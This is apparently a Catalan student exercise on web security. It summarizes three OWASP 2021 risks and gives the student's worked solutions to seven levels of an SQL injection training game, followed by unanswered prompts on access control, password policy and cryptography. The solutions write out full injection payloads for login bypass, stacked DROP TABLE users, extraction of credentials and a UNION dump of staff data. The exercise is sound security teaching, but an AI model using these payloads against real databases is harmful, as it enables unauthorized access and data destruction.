##### L’organització OWASP Foundation va actualitzar en 2021 el seu Top 10 de vulnerabilitats més trobades en aplicacions web. 

#### Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera diferents mesures i tècniques per poder evitar-les.

- Numero 1 (A03-2021-Inyeccion) :

  Impacte: Permet als atacants executar comandes malicioses, obtenint accés no autoritzat a dades o control sobre el sistema.

  Danys possibles: Robatori o destrucció de dades, execució remota de codi, escalada de privilegis.

  Mesures de protecció: Utilitzar consultes preparades, validar i sanear les entrades, fer servir ORM, aplicar el principi de mínim privilegi, detectar vulnerabilitats en el codi.

- Numero 2 (A04-2021- Diseño Inseguro) : 

  Impacte: Decisions de disseny incorrectes poden exposar l'aplicació a riscos de seguretat. 

  Danys possibles: Accés no autoritzat, filtració de dades, manipulació de dades, exposició de serveis vulnerables. 

  Mesures de protecció: Aplicar seguretat des del disseny, segregació de privilegis, autenticació robusta, revisió contínua del disseny i proves de seguretat.

- Numero 3 (A08-2021-Fallas en el Software y en la Integridad de los Datos) :

  Impacte: Errors en el programari poden afectar la seguretat i la integritat de les dades.

  Danys possibles: Dades corruptes, vulnerabilitats explotades per atacants.

  Mesures de protecció: Revisar codi regularment, implementar validació de dades, i mantenir actualitzats els parches de seguretat.

#### Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 
Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i 
Entity Framework. 

Nivell 1:

On posas l'usuari li e posat d'avant l'apostrof per tancar el comentari de username per despres comenta el resta del codi amb dos - pero poder entrar sense contrasenya

SELECT username 
FROM users 
WHERE username ='jane' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';

Nivell 2:

E comentat com en el nivell anterior jane i li e afegit un punt i coma per a poder fer el DROP TABLE users amb el seu respectiu ; al final i per ultim els dos - per comentar la part de la contrasenya per a que no sigui necesaria

SELECT username 
FROM users 
WHERE username ='jane'; DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

Nivell 3:

En aquest nivell e fet que directament fes un select dels users per a poder accedir i e comentat com sempre la part de la contrasenya

SELECT username 
FROM users 
WHERE username ='';SELECT username FROM users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

Nivell 4:

en aquest nivell e fet el mateix que l'anterior peró e modificat la part del select per a que nomes retorni 1 nom utilitzant la sentencia limit

SELECT username 
FROM users 
WHERE username ='';SELECT username from users limit 1 --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

Nivell 5:

en aquest nivell e fet un select a una altra taula en aquest cas la de users per a fer un select de username i password

SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand='';select username,password from users;';

Nivell 6:

SELECT username 
FROM users 
WHERE username ='';select salary as username from staff where firstname = 'Greta Maria';--' AND password ='d41d8cd98f00b204e9800998ecf8427e';

en aquest nivell e fet que selecioni el salary amb el seu username de la taula staff on el firstname sigui 'Greta Maria' comentant com sempre la contrasenya

Nivell 7:

SELECT product_id, brand, size, price 
FROM shoes 
WHERE brand='' UNION SELECT firstname AS product_id, email AS brand, salary AS size, employed_since AS price FROM staff WHERE name = '' OR name != '';

#### L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu.  Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades bancaries per fer els pagaments. Hi ha un tipus d’usuari Acount Manager que s’encarrega de verificar als nous artistes. Un cop aprovats poden pública i vendre les seves obres.

#### Ara es vol aplicar aplicant els principis  de seguretat per tal de garantir el servei i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques de seguretat. Elabora els següents apartats:

- Definició del control d’accés: enumera els rols  i quin accés a dades tenen cada rol. 


- Definició de la política de contrasenyes: normes de creació, d’ús i canvi de contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari.

  
- Avaluació de la informació: determina quin valor tenen les dades que treballa l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?

#### En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.

#### Crea un projecte de consola amb un menú amb tres opcions:

- Registre: l’usuari ha d’introduir username i una password. De la combinació dels dos camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. Mostra per pantalla el resultat.
Verificació de dades: usuari ha de tornar a introduir les dades el programa mostra per pantalla si les dades són correctes.

- Encriptació i desencriptació amb RSA. L’usuari entrarà un text per consola. A continuació mostra el text encriptat i en la següent línia el text desencriptat. L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per desencriptar. No cal guardar-les en memòria persistent.
	Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.


Indica les referències que has consultat, seguint el següent format:
Indica les fonts que has consultat (pàgines web, llibres, revistes,...). Cal seguir la notació bibliogràfica següent:
